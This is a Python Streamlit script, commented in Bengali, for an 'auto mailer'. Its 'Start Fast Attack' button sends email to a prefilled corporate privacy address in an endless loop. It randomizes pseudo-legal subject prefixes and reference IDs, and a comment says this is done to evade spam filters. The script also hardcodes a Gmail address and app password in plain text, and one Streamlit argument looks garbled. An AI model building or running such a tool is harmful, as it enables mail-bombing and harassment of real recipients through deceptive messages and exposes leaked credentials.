import streamlit as st
import time, random, string, smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ==========================================
# আপনার জিমেইল তথ্য
GMAIL_USER = "strikeforwardcopyright@gmail.com"
GMAIL_PASS = "pzawunzznbnkuags" 
# ==========================================

# পেজ সেটআপ
st.set_page_config(page_title="AF Media Fast Mailer", page_icon="⚡", layout="wide")

# CSS দিয়ে ডিজাইন একটু সুন্দর করা
st.markdown("""
    <style>
    .main { background-color: #0e1117; color: white; }
    .stButton>button { width: 100%; background-color: #ff4b4b; color: white; height: 3em; font-size: 20px; }
    </style>
    """, unsafe_allow_stdio=True)

st.title("⚡ AF Media Group - High Speed Auto Mailer")
st.write("গিটহাব এবং স্ট্রিমলিট ক্লাউড দিয়ে পরিচালিত প্রফেশনাল মেইলার।")

# ইনপুট সেকশন
col1, col2 = st.columns([1, 1])

with col1:
    target_email = st.text_input("Target Email (যেমন: privacycontact@twdc.com):", "privacycontact@twdc.com")
    mail_subject = st.text_input("Subject:", "Urgent: Copyright Compliance Notice")
    interval = st.slider("Interval (সেকেন্ড):", 2, 60, 10)

with col2:
    mail_body = st.text_area("Message Body:", placeholder="আপনার মেইন মেসেজটি এখানে লিখুন...", height=180)

# অ্যাটাক বাটন
if st.button("🚀 Start Fast Attack"):
    if not mail_body:
        st.error("দয়া করে মেসেজ বডি লিখুন!")
    else:
        st.success(f"অ্যাটাক শুরু হয়েছে! প্রতি {interval} সেকেন্ড পর পর মেইল পাঠানো হচ্ছে...")
        
        status_box = st.empty()
        log_box = st.empty()
        sent_count = 0
        logs = []

        # ইমেইল পাঠানোর লুপ
        while True:
            try:
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                    server.login(GMAIL_USER, GMAIL_PASS)
                    
                    # টার্গেট লিস্ট (কমা দিয়ে আলাদা করা থাকলে)
                    targets = [t.strip() for t in target_email.split(",")]
                    
                    for target in targets:
                        # প্রতিবার আলাদা রেফারেন্স আইডি এবং সাবজেক্ট প্রিফিক্স
                        ref_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
                        prefixes = ["Re:", "Fwd:", "IMPORTANT:", "LEGAL:", "Urgent:"]
                        dynamic_subject = f"{random.choice(prefixes)} {mail_subject} [Ref: {ref_id}]"
                        
                        msg = MIMEMultipart()
                        msg['From'] = f"AF Media Enforcement <{GMAIL_USER}>"
                        msg['To'] = target
                        msg['Subject'] = dynamic_subject
                        
                        # বডির শেষে অটো-জেনারেটেড তথ্য যোগ করা যাতে স্প্যাম ফিল্টার এড়ানো যায়
                        final_body = f"{mail_body}\n\n" + "-"*30 + f"\nSystem ID: {ref_id}\nTimestamp: {time.ctime()}\nSent by: AF Media High-Speed Node"
                        
                        msg.attach(MIMEText(final_body, 'plain', 'utf-8'))
                        
                        server.send_message(msg)
                        sent_count += 1
                        
                        # ড্যাশবোর্ডে আপডেট
                        status_box.metric("Total Mails Sent ✅", f"{sent_count}")
                        logs.insert(0, f"✅ [{time.strftime('%H:%M:%S')}] Sent to {target} (Ref: {ref_id})")
                        log_box.code("\n".join(logs[:15])) # লেটেস্ট ১৫টি লগ দেখাবে
                        
                        time.sleep(interval)
                        
            except Exception as e:
                st.error(f"সার্ভার এরর: {e}")
                time.sleep(20) # এরর আসলে ২০ সেকেন্ড বিরতি নিয়ে আবার চেষ্টা করবে